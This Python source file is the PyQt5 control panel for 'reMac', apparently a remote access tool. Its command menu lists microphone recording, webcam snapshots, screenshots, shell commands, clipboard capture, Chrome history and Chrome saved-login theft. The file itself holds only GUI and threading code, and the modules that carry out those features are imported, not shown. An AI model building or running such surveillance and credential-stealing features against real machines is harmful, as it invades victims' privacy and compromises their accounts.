import sys

from PyQt5.QtWidgets import QApplication, QLabel, QWidget, QVBoxLayout, QHBoxLayout, QPushButton, \
    QTextEdit, QLineEdit, QComboBox, QTabWidget, QMainWindow, QAction, QGroupBox
from PyQt5.QtCore import QThread, QSettings
from PyQt5 import QtGui, QtCore

from libs.LineEdit import LineEdit
from apps.server.reMac_server import reMac_server
from apps.client.reMac_client import reMac_client
from libs.StartServerWorker import StartServerWorker
from libs.StartClientWorker import StartClientWorker
from help_dialog import help_dialog
from pref_dialog import pref_dialog

app = QApplication([])
txtOutputServer = QTextEdit()
txtOutputClient = QTextEdit()
txtHost = QLineEdit("192.168.0.49")
txtPort = QLineEdit("6890")
settings = QSettings("kimhauser.ch", "reMacQt5");


class reMacQtApp(QMainWindow):

    sentCommands = []
    myreMac_server = reMac_server()
    myreMac_client = reMac_client()

    cmd_start_server = QPushButton('Start Server')
    cmd_send_command = QPushButton('Send command')

    cmb_modules = QComboBox()
    txtCmdToSend = LineEdit()

    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):

        self.prefWin.initUI(settings)

        window = QWidget()
        wdgtServer = QWidget()
        layoutServer = QVBoxLayout()
        wdgtClient = QWidget()
        layoutClient = QVBoxLayout()
        layoutModuleCommand = QVBoxLayout()

        layout = QVBoxLayout()
        self.setFixedWidth(710)

        layConn = QHBoxLayout()
        wdgtConn = QGroupBox("Connection:")
        wdgtConn.setFont(QtGui.QFont("Arial", 13))
        wdgtConn.setLayout(layConn)

        layIP = QVBoxLayout()
        wdgtIP = QWidget()
        wdgtIP.setFixedWidth(500)
        wdgtIP.setLayout(layIP)
        layIP.addWidget(QLabel('IP address:'))
        layIP.addWidget(txtHost)
        layConn.addWidget(wdgtIP)
        layPort = QVBoxLayout()
        wdgtPort = QWidget()
        wdgtPort.setLayout(layPort)
        layPort.addWidget(QLabel('Port:'))
        layPort.addWidget(txtPort)
        layConn.addWidget(wdgtPort)
        layout.addWidget(wdgtConn)

        self.cmd_start_server.clicked.connect(self.runStartServer)
        layoutServer.addWidget(self.cmd_start_server)

        cmd_start_client = QPushButton('Start Client')
        cmd_start_client.clicked.connect(self.runStartClient)
        layoutClient.addWidget(cmd_start_client)
        layoutClient.addSpacing(20)
        wdgtModuleSendCmd = QGroupBox("Send command to server:")
        wdgtModuleSendCmd.setLayout(layoutModuleCommand)

        self.cmb_modules.addItem("Hello World", "hw")
        self.cmb_modules.addItem("Module help", "mh")
        self.cmb_modules.addItem("Copy clipboard", "cb")
        self.cmb_modules.addItem("Record microphone", "rm")
        self.cmb_modules.addItem("Screenshot", "sc")
        self.cmb_modules.addItem("Shell command", "sh")
        self.cmb_modules.addItem("Webcam snapshot", "wc")
        self.cmb_modules.addItem("Chrome history", "ch")
        self.cmb_modules.addItem("Chrome logins", "cl")
        self.cmb_modules.addItem("System information", "in")
        self.cmb_modules.addItem("Download file", "dl")
        self.cmb_modules.addItem("Upload file", "ul")

        self.cmb_modules.currentIndexChanged.connect(self.moduleCmbSel)

        layoutModuleCommand.addWidget(QLabel('Module:'))
        layoutModuleCommand.addWidget(self.cmb_modules)
        layoutModuleCommand.addWidget(QLabel('Command / Parameter:'))
        layoutSendCmd = QHBoxLayout()
        wdgtSendCmd = QWidget()
        wdgtSendCmd.setLayout(layoutSendCmd)

        layoutSendCmd.addWidget(self.txtCmdToSend)
        self.txtCmdToSend.setFocus()
        self.cmd_send_command.clicked.connect(self.sendCommand)

        self.txtCmdToSend.returnPressed.connect(self.cmd_send_command.click)
        self.txtCmdToSend.upPressed.connect(self.keyUpPressed)
        self.txtCmdToSend.downPressed.connect(self.keyDownPressed)

        layoutSendCmd.addWidget(self.cmd_send_command)
        layoutModuleCommand.addWidget(wdgtSendCmd)

        layoutClient.addWidget(wdgtModuleSendCmd)

        tabWdgt = QTabWidget()
        tabWdgt.setFont(QtGui.QFont("Arial", 13))
        layoutServerOutputLine = QHBoxLayout()
        layoutServerOutputLine .addWidget(QLabel('Output:'))
        cmd_clear_server_output = QPushButton('')
        cmd_clear_server_output.setIcon(QtGui.QIcon('images/empty-set.png'))
        cmd_clear_server_output.setIconSize(QtCore.QSize(16, 16))
        cmd_clear_server_output.setFixedWidth(48)
        cmd_clear_server_output.clicked.connect(self.clear_output_server)
        layoutServerOutputLine.addWidget(cmd_clear_server_output)
        wdgtServerOutputLine = QWidget()
        wdgtServerOutputLine.setFixedHeight(64)
        wdgtServerOutputLine.setLayout(layoutServerOutputLine)
        layoutServer.addWidget(wdgtServerOutputLine)

        txtOutputServer.setFontFamily("Courier")
        txtOutputServer.setFontPointSize(14)
        txtOutputServer.setFontWeight(25)
        txtOutputServer.setReadOnly(True)
        layoutServer.addWidget(txtOutputServer)
        wdgtServer.setLayout(layoutServer)
        tabWdgt.addTab(wdgtServer, QtGui.QIcon('images/server.png'), "Server")

        layoutClientOutputLine = QHBoxLayout()
        layoutClientOutputLine.addWidget(QLabel('Output:'))
        cmd_clear_client_output = QPushButton('')
        cmd_clear_client_output.setIcon(QtGui.QIcon('images/empty-set.png'))
        cmd_clear_client_output.setIconSize(QtCore.QSize(16, 16))
        cmd_clear_client_output.setFixedWidth(48)
        cmd_clear_client_output.clicked.connect(self.clear_output_client)
        layoutClientOutputLine.addWidget(cmd_clear_client_output)
        wdgtClientOutputLine = QWidget()
        wdgtClientOutputLine.setFixedHeight(64)
        wdgtClientOutputLine.setLayout(layoutClientOutputLine)
        layoutClient.addWidget(wdgtClientOutputLine)
        txtOutputClient.setFontFamily("Courier")
        txtOutputClient.setFontPointSize(14)
        txtOutputClient.setReadOnly(True)
        txtOutputClient.setFixedHeight(250)
        layoutClient.addWidget(txtOutputClient)
        wdgtClient.setLayout(layoutClient)
        idx = tabWdgt.addTab(wdgtClient, QtGui.QIcon('images/hosting.png'), "Client")
        layout.addWidget(tabWdgt)

        window.setLayout(layout)
        exitAct = QAction(QtGui.QIcon('images/open.png'), ' &Help', self)
        prefAct = QAction('&Preferences', self, triggered=self.showPref)
        quitAct = QAction('&Quit reMac', self,  triggered=self.exitApp)

        menubar = self.menuBar()
        menubar.setNativeMenuBar(False)
        fileMenu = menubar.addMenu('&File')
        fileMenu.addAction(prefAct)
        fileMenu.addSeparator()
        fileMenu.addAction(quitAct)

        helpMenu = menubar.addMenu('&Help')
        helpMenu.addAction(exitAct)
        helpMenu.triggered[QAction].connect(self.showHelp)

        self.setCentralWidget(window)
        self.statusBar()
        self.setWindowTitle("reMac v0.0.1 - Qt5-App")
        self.show()
        app.exec()

    sentCmdListCursor = -1
    hlpWin = help_dialog()
    prefWin = pref_dialog()

    def moduleCmbSel(self):
        self.txtCmdToSend.setText(self.cmb_modules.currentData())

    def exitApp(self):
        sys.exit(0)

    def showPref(self):
        self.prefWin.showDialog()

    def showHelp(self):
        help_file = open(f'help.html', 'rb')
        help_txt = help_file.read()
        self.hlpWin.initUI()

    def keyDownPressed(self):
        if self.sentCmdListCursor < -1:
            self.sentCmdListCursor += 1
            self.txtCmdToSend.setText(self.sentCommands[self.sentCmdListCursor])

    def keyUpPressed(self):
        if (self.sentCmdListCursor) * -1 <= len(self.sentCommands):
            self.txtCmdToSend.setText(self.sentCommands[self.sentCmdListCursor])
            self.sentCmdListCursor -= 1

    def serverStarted(self, ok):
        conHost = "192.168.0.49"
        conPort = "6890"

        # if ok == 1:
        #     print(f"Starting reMacApp Server: {conHost}:{conPort} ...")
        #     self.log_output_server(f"Starting reMacApp Server: {conHost}:{conPort} ...")
        if ok == 2:
            self.cmd_start_server.setText("Stop Server")
            self.log_output_server(f"reMac Server started successfully - Listening on: {conHost}:{conPort}")

    def runStartServer(self):
        # Step 2: Create a QThread object
        self.thread = QThread()
        # Step 3: Create a worker object
        self.worker = StartServerWorker(self)
        # Step 4: Move worker to the thread
        self.worker.moveToThread(self.thread)
        # Step 5: Connect signals and slots
        self.thread.started.connect(self.worker.run)
        self.worker.finished.connect(self.thread.quit)
        self.worker.finished.connect(self.worker.deleteLater)
        self.thread.finished.connect(self.thread.deleteLater)
        self.thread.finished.connect(self.serverStarted)
        self.worker.progress.connect(self.serverStarted)
        self.worker.progressng.connect(self.log_output_server)
        self.thread.start()

        self.thread.finished.connect(
            lambda: self.serverStarted(True)
        )

    def runStartClient(self):
        # Step 2: Create a QThread object
        self.threadClient = QThread()
        # Step 3: Create a worker object
        self.workerClient = StartClientWorker(self)
        # Step 4: Move worker to the thread
        self.workerClient.moveToThread(self.threadClient)
        # Step 5: Connect signals and slots
        self.threadClient.started.connect(self.workerClient.run)

        # self.workerClient.finished.connect(self.threadClient.quit)
        # self.workerClient.finished.connect(self.workerClient.deleteLater)

        # self.thread.finished.connect(self.threadClient.deleteLater)
        # self.thread.finished.connect(self.serverStarted)
        self.workerClient.progress.connect(self.log_output_client)
        # self.workerClient.progressng.connect(self.log_output_server)
        self.threadClient.start()

        # self.threadClient.finished.connect(
        #     lambda: self.serverStarted(True)
        # )

    def startServer(self, prg, prgng):
        shost = txtHost.text()
        sport = txtPort.text()
        prgng.emit(f"Starting reMacApp Server: {shost}:{sport} ...")
        self.myreMac_server.start_server(shost, sport, prg, prgng)

    clientPrg = None

    def startClient(self, prg):
        self.clientPrg = prg
        shost = txtHost.text()
        sport = txtPort.text()
        prg.emit(f"Starting reMacApp Client: {shost}:{sport} ...")
        self.myreMac_client.start_client(shost, sport, prg)

    def sendCommand(self):
        cmd2Send = self.txtCmdToSend.text().strip()
        if cmd2Send == "":
            return
        self.sentCommands.append(cmd2Send)
        self.txtCmdToSend.setText("")
        self.recalledCommand = -1

        shost = txtHost.text()
        sport = txtPort.text()

        self.log_output_client(f'Sending command "{cmd2Send}" to: {shost}:{sport} ...')
        # self.clientPrg.emit(f"Starting reMacApp Client: {shost}:{sport} ...")
        self.myreMac_client.start_client(shost, sport, self.clientPrg, cmd2Send)

    def clear_output_server(self):
        txtOutputServer.setText("")

    def log_output_server(self, msg):
        txtOutputServer.append(msg)
        txtOutputServer.verticalScrollBar().setValue(txtOutputServer.verticalScrollBar().maximum())

    def clear_output_client(self):
        txtOutputClient.setText("")

    def log_output_client(self, msg):
        txtOutputClient.append(msg)
        txtOutputClient.verticalScrollBar().setValue(txtOutputClient.verticalScrollBar().maximum())
